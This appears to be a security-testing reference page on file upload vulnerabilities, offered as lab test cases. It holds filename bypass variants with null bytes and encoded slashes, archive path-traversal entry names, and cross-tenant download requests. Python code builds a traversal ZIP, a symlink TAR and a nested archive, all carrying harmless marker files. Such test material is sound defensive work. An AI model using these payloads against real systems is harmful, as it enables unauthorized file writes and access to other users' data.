blocks.text: File upload vulnerabilities occur when a web application allows users to upload files without properly validating the file type, content, or destination. Attackers can exploit these vulnerabilities to upload malicious files, leading to remote code execution (RCE), arbitrary file read/write, cross-site scripting (XSS), and other attacks.

items: Extension bypasses (double extensions, case variations, null bytes)
**Remote Code Execution (RCE)** - Upload and execute web shells
**Cross-Site Scripting (XSS)** - Upload HTML/SVG files with JavaScript
**Denial of Service** - Upload large files, zip bombs
Blacklist-based file type validation (instead of whitelist)

sections.label: Upload Processing, Archive and Storage Payloads
Filename normalization: compare stored names, download disposition and parser-selected type
SVG external resource / processing control: collector sees only synthetic markers
HTML/SVG download rendering controls: a safe serving policy may force attachment or isolate origins
Archive entry names: create a tiny archive containing a marker file at exactly one of these paths
Processing metadata: independently compare raw upload, converted preview and downloaded original
Storage/download authorization: own file A versus other owned test account B's file
Signed URL method/expiry controls; use locally generated capabilities
Multipart filename versus explicit path field disagreement
Tiny traversal ZIP generator; creates an archive but never extracts it
Symlink-before-file TAR generator; evaluate only in an isolated extraction root
Two-level tiny archive; no compression bomb

# Upload Processing, Archive and Storage Payloads # Independent filename, metadata, archive-generator and content records. # Filename normalization: compare stored names, download disposition and parser-selected type upload-lab-report.PnG upload-lab-report.png. upload-lab-report.png%00.txt upload-lab-report.png%2fmetadata.txt upload-lab-report%5cmetadata.png upload-lab-résumé.txt upload-lab-résumé.txt Content-Disposition: form-data; name="file"; filename="upload-lab-image.txt" Content-Type: image/png; charset=utf-8 Content-Type: application/x-upload-lab # SVG external resource / processing control: collector sees only synthetic markers # HTML/SVG download rendering controls: a safe serving policy may force attachment or isolate origins

Harmless uploaded document

# Archive entry names: create a tiny archive containing a marker file at exactly one of these paths ../upload-lab-outside-marker.txt safe/../../upload-lab-parent-marker.txt /tmp/upload-lab-absolute-marker.txt ..\upload-lab-windows-marker.txt C:\upload-lab\absolute-marker.txt # Processing metadata: independently compare raw upload, converted preview and downloaded original {"filename":"upload-lab-preview.png","contentType":"image/png","generatePreview":true,"marker":"upload-preview-control"} {"filename":"upload-lab-document.svg","contentType":"image/svg+xml","generatePreview":true,"marker":"upload-conversion-control"} # Storage/download authorization: own file A versus other owned test account B's file GET /api/upload-lab/files/upload-file-b/download HTTP/1.1 GET /api/upload-lab/files/upload-file-b/preview HTTP/1.1 GET /api/upload-lab/files/upload-file-b/metadata HTTP/1.1 {"fileId":"upload-file-b","displayName":"upload-ownership-marker"} {"objectKey":"upload-tenant-b/upload-file-b.txt","filename":"upload-owned-marker.txt"} {"tenantId":"upload-tenant-b","storagePath":"upload-private-b","filename":"upload-context-marker.txt"} # Signed URL method/expiry controls; use locally generated capabilities curl -sS -X PUT "$LAB_SIGNED_UPLOAD_URL" -H 'Content-Type: text/plain' --data-binary 'UPLOAD_SIGNED_METHOD_MARKER' curl -sS -X POST "$LAB_SIGNED_UPLOAD_URL" -H 'Content-Type: text/plain' --data-binary 'UPLOAD_WRONG_METHOD_MARKER' curl -sS "$LAB_EXPIRED_DOWNLOAD_URL" # Multipart filename versus explicit path field disagreement {"filename":"upload-lab-safe.txt","path":"../upload-lab-path-marker.txt"} # Tiny traversal ZIP generator; creates an archive but never extracts it import zipfile with zipfile.ZipFile('upload-lab-traversal.zip', 'w') as upload_zip: upload_zip.writestr('../upload-lab-outside-marker.txt', 'UPLOAD_ARCHIVE_BOUNDARY') # Symlink-before-file TAR generator; evaluate only in an isolated extraction root import io, tarfile with tarfile.open('upload-lab-symlink.tar', 'w') as upload_tar: upload_link = tarfile.TarInfo('upload-lab-link') upload_link.type = tarfile.SYMTYPE upload_link.linkname = '../upload-lab-sibling' upload_tar.addfile(upload_link) upload_data = b'UPLOAD_SYMLINK_BOUNDARY' upload_entry = tarfile.TarInfo('upload-lab-link/marker.txt') upload_entry.size = len(upload_data) upload_tar.addfile(upload_entry, io.BytesIO(upload_data)) # Two-level tiny archive; no compression bomb upload_inner = io.BytesIO() with zipfile.ZipFile(upload_inner, 'w') as upload_nested: upload_nested.writestr('upload-nested-marker.txt', 'UPLOAD_NESTED_CONTROL') with zipfile.ZipFile('upload-lab-nested.zip', 'w') as upload_outer: upload_outer.writestr('inner.zip', upload_inner.getvalue())
